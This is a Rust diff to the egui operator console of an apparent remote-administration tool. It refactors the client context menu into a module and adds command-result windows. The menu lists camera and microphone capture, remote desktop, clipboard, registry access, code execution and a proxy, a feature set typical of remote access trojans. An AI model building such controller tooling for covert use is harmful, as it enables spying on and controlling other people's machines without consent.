@@ -1,3 +1,5 @@
+mod command_menu;
+
 use eframe::egui;
 use rdl_protocol::{
     read_envelope, write_envelope_with_token, ClientInfo, CommandKind, Message, Role,
@@ -275,7 +277,23 @@ struct AdminApp {
     clients: Vec<ClientRow>,
     client_filter: String,
     selected_client_id: Option<String>,
+    command_windows: Vec<CommandResultWindow>,
     log_lines: Vec<String>,
+}
+
+struct CommandResultWindow {
+    id: u64,
+    client_id: String,
+    command: CommandKind,
+    status: CommandResultStatus,
+    detail: String,
+    open: bool,
+}
+
+enum CommandResultStatus {
+    Pending,
+    Accepted,
+    Failed,
 }
 
 #[derive(Clone)]
@@ -307,6 +325,7 @@ impl AdminApp {
             clients: Vec::new(),
             client_filter: String::new(),
             selected_client_id: None,
+            command_windows: Vec::new(),
             log_lines: vec!["admin gui started".to_string()],
         }
     }
@@ -339,13 +358,7 @@ impl AdminApp {
                     command,
                     accepted,
                     detail,
-                } => self.log_lines.push(format!(
-                    "ack client={} command={} accepted={} detail={}",
-                    client_id,
-                    command.as_str(),
-                    accepted,
-                    detail
-                )),
+                } => self.handle_command_ack(client_id, command, accepted, detail),
                 AdminEvent::Log(line) => self.log_lines.push(line),
             }
             if self.log_lines.len() > 300 {
@@ -406,11 +419,79 @@ impl AdminApp {
             command: command.clone(),
             payload: String::new(),
         });
+        self.open_command_window(client_id, command.clone());
         self.log_lines.push(format!(
             "sent command={} to {}",
             command.as_str(),
             client_id
         ));
+    }
+
+    fn open_command_window(&mut self, client_id: &str, command: CommandKind) {
+        self.command_windows.push(CommandResultWindow {
+            id: self.next_command_window_id(),
+            client_id: client_id.to_string(),
+            command,
+            status: CommandResultStatus::Pending,
+            detail: "Waiting for client result...".to_string(),
+            open: true,
+        });
+    }
+
+    fn next_command_window_id(&self) -> u64 {
+        self.command_windows
+            .iter()
+            .map(|window| window.id)
+            .max()
+            .unwrap_or(0)
+            .saturating_add(1)
+    }
+
+    fn handle_command_ack(
+        &mut self,
+        client_id: String,
+        command: CommandKind,
+        accepted: bool,
+        detail: String,
+    ) {
+        self.log_lines.push(format!(
+            "ack client={} command={} accepted={}",
+            client_id,
+            command.as_str(),
+            accepted
+        ));
+
+        if accepted && detail == "forwarded" {
+            return;
+        }
+
+        if let Some(window) = self.command_windows.iter_mut().rev().find(|window| {
+            window.client_id == client_id
+                && window.command == command
+                && matches!(window.status, CommandResultStatus::Pending)
+        }) {
+            window.status = if accepted {
+                CommandResultStatus::Accepted
+            } else {
+                CommandResultStatus::Failed
+            };
+            window.detail = detail;
+            window.open = true;
+            return;
+        }
+
+        self.command_windows.push(CommandResultWindow {
+            id: self.next_command_window_id(),
+            client_id,
+            command,
+            status: if accepted {
+                CommandResultStatus::Accepted
+            } else {
+                CommandResultStatus::Failed
+            },
+            detail,
+            open: true,
+        });
     }
 
     fn render_menu_bar(&mut self, ui: &mut egui::Ui) {
@@ -419,7 +500,9 @@ impl AdminApp {
                 section_title(ui, "Commands");
                 ui.separator();
                 if let Some(client_id) = self.selected_client_id.clone() {
-                    render_context_menu(ui, &client_id, self);
+                    command_menu::render_context_menu(ui, &client_id, &mut |client_id, command| {
+                        self.send_command(client_id, command);
+                    });
                 } else {
                     ui.label(
                         egui::RichText::new("Select a client to enable command menus")
@@ -538,8 +621,15 @@ impl AdminApp {
                                 if response.clicked() {
                                     self.selected_client_id = Some(client.id.clone());
                                 }
-                                response
-                                    .context_menu(|ui| render_context_menu(ui, &client.id, self));
+                                response.context_menu(|ui| {
+                                    command_menu::render_context_menu(
+                                        ui,
+                                        &client.id,
+                                        &mut |client_id, command| {
+                                            self.send_command(client_id, command);
+                                        },
+                                    );
+                                });
 
                                 ui.label(egui::RichText::new(&client.fingerprint).size(12.0));
                                 ui.label(&client.hostname);
@@ -568,6 +658,55 @@ impl AdminApp {
                 });
         });
     }
+
+    fn render_command_windows(&mut self, ctx: &egui::Context) {
+        for window in &mut self.command_windows {
+            if !window.open {
+                continue;
+            }
+            let title = format!(
+                "{} - {}",
+                command_title(&window.command),
+                compact_id(&window.client_id)
+            );
+            egui::Window::new(title)
+                .id(egui::Id::new(("command_result", window.id)))
+                .open(&mut window.open)
+                .default_width(680.0)
+                .default_height(420.0)
+                .resizable(true)
+                .show(ctx, |ui| {
+                    ui.horizontal(|ui| {
+                        ui.label(egui::RichText::new("Client").color(COLOR_MUTED));
+                        ui.label(egui::RichText::new(&window.client_id).color(COLOR_TEXT));
+                        ui.separator();
+                        ui.label(egui::RichText::new("Command").color(COLOR_MUTED));
+                        ui.label(
+                            egui::RichText::new(window.command.as_str())
+                                .color(COLOR_TEXT)
+                                .strong(),
+                        );
+                        ui.separator();
+                        result_status_badge(ui, &window.status);
+                    });
+                    ui.add_space(10.0);
+                    egui::ScrollArea::vertical()
+                        .id_salt(("command_result_scroll", window.id))
+                        .stick_to_bottom(false)
+                        .show(ui, |ui| {
+                            ui.add(
+                                egui::TextEdit::multiline(&mut window.detail)
+                                    .font(egui::TextStyle::Monospace)
+                                    .desired_width(f32::INFINITY)
+                                    .desired_rows(18)
+                                    .interactive(false),
+                            );
+                        });
+                });
+        }
+        self.command_windows
+            .retain(|window| window.open || matches!(window.status, CommandResultStatus::Pending));
+    }
 }
 
 impl eframe::App for AdminApp {
@@ -586,6 +725,7 @@ impl eframe::App for AdminApp {
             ui.add_space(12.0);
             self.render_activity(ui);
         });
+        self.render_command_windows(ui.ctx());
 
         ui.ctx()
             .request_repaint_after(std::time::Duration::from_millis(200));
@@ -705,6 +845,15 @@ fn client_status_badge(ui: &mut egui::Ui, status: ClientStatus) {
     status_badge(ui, text, color);
 }
 
+fn result_status_badge(ui: &mut egui::Ui, status: &CommandResultStatus) {
+    let (text, color) = match status {
+        CommandResultStatus::Pending => ("Pending", COLOR_WARN),
+        CommandResultStatus::Accepted => ("Done", COLOR_GOOD),
+        CommandResultStatus::Failed => ("Failed", COLOR_BAD),
+    };
+    status_badge(ui, text, color);
+}
+
 fn status_badge(ui: &mut egui::Ui, text: &str, color: egui::Color32) {
     egui::Frame::default()
         .fill(color.gamma_multiply(0.10))
@@ -722,6 +871,21 @@ fn compact_id(value: &str) -> String {
     } else {
         value.to_string()
     }
+}
+
+fn command_title(command: &CommandKind) -> String {
+    command
+        .as_str()
+        .split('_')
+        .map(|part| {
+            let mut chars = part.chars();
+            match chars.next() {
+                Some(first) => format!("{}{}", first.to_ascii_uppercase(), chars.as_str()),
+                None => String::new(),
+            }
+        })
+        .collect::<Vec<_>>()
+        .join(" ")
 }
 
 fn last_seen_label(last_seen_epoch_ms: u128) -> String {
@@ -793,225 +957,6 @@ fn empty_state(ui: &mut egui::Ui) {
         );
     });
     ui.add_space(48.0);
-}
-
-fn render_context_menu(ui: &mut egui::Ui, client_id: &str, app: &mut AdminApp) {
-    ui.menu_button("Session", |ui| {
-        ui.menu_button("Client", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Update Client",
-                CommandKind::UpdateClient,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Uninstall Client",
-                CommandKind::UninstallClient,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Kill Client Process",
-                CommandKind::KillClientProcess,
-            );
-        });
-        ui.menu_button("Power", |ui| {
-            menu_command(ui, app, client_id, "Shutdown", CommandKind::Shutdown);
-            menu_command(ui, app, client_id, "Reboot", CommandKind::Reboot);
-        });
-        ui.menu_button("Session Management", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Move To Group",
-                CommandKind::MoveToGroup,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Clone Client Settings",
-                CommandKind::CloneClientSettings,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Delete Client",
-                CommandKind::DeleteClient,
-            );
-        });
-    });
-    ui.menu_button("Remote Management", |ui| {
-        ui.menu_button("Files And Terminal", |ui| {
-            menu_command(ui, app, client_id, "File Manager", CommandKind::FileManager);
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Remote Terminal",
-                CommandKind::RemoteTerminal,
-            );
-        });
-        ui.menu_button("System Tools", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Process Manager",
-                CommandKind::ProcessManager,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Window Manager",
-                CommandKind::WindowManager,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Startup Manager",
-                CommandKind::StartupManager,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Registry Manager",
-                CommandKind::RegistryManager,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Driver Manager",
-                CommandKind::DriverManager,
-            );
-            menu_command(ui, app, client_id, "Event Log", CommandKind::EventLog);
-        });
-        ui.menu_button("Monitoring", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Active Connections",
-                CommandKind::ActiveConnections,
-            );
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Performance Monitor",
-                CommandKind::PerformanceMonitor,
-            );
-        });
-    });
-    ui.menu_button("Live Control", |ui| {
-        ui.menu_button("Desktop", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Remote Desktop",
-                CommandKind::RemoteDesktop,
-            );
-        });
-        ui.menu_button("Media Devices", |ui| {
-            menu_command(ui, app, client_id, "Camera", CommandKind::Camera);
-            menu_command(ui, app, client_id, "Audio Listen", CommandKind::AudioListen);
-        });
-    });
-    ui.menu_button("User Interaction", |ui| {
-        ui.menu_button("Prompts", |ui| {
-            menu_command(ui, app, client_id, "Message Box", CommandKind::MessageBox);
-            menu_command(ui, app, client_id, "Balloon Tip", CommandKind::BalloonTip);
-        });
-        ui.menu_button("Communication", |ui| {
-            menu_command(ui, app, client_id, "Text Chat", CommandKind::TextChat);
-            menu_command(ui, app, client_id, "Voice Chat", CommandKind::VoiceChat);
-        });
-        ui.menu_button("Text Actions", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Open Text In Notepad",
-                CommandKind::OpenTextInNotepad,
-            );
-        });
-    });
-    ui.menu_button("System Info", |ui| {
-        ui.menu_button("Basics", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Computer Info",
-                CommandKind::ComputerInfo,
-            );
-            menu_command(ui, app, client_id, "Clipboard", CommandKind::Clipboard);
-        });
-        ui.menu_button("Network", |ui| {
-            menu_command(ui, app, client_id, "Proxy", CommandKind::Proxy);
-        });
-    });
-    ui.menu_button("Execute", |ui| {
-        ui.menu_button("Code And Files", |ui| {
-            menu_command(ui, app, client_id, "Execute File", CommandKind::ExecuteFile);
-            menu_command(ui, app, client_id, "Execute Code", CommandKind::ExecuteCode);
-        });
-        ui.menu_button("Tasks", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Execute Static Command",
-                CommandKind::ExecuteStaticCommand,
-            );
-            menu_command(ui, app, client_id, "Create Task", CommandKind::CreateTask);
-        });
-        ui.menu_button("Automation", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Command Preset",
-                CommandKind::CommandPreset,
-            );
-        });
-    });
-    ui.menu_button("Plugins", |ui| {
-        ui.menu_button("Extensions", |ui| {
-            menu_command(
-                ui,
-                app,
-                client_id,
-                "Plugin Manager",
-                CommandKind::PluginManager,
-            );
-        });
-    });
-}
-
-fn menu_command(
-    ui: &mut egui::Ui,
-    app: &mut AdminApp,
-    client_id: &str,
-    label: &str,
-    command: CommandKind,
-) {
-    if ui.button(label).clicked() {
-        app.send_command(client_id, command);
-        ui.close();
-    }
 }
 
 fn terminal_input_loop(input_tx: Sender<AdminInput>) {
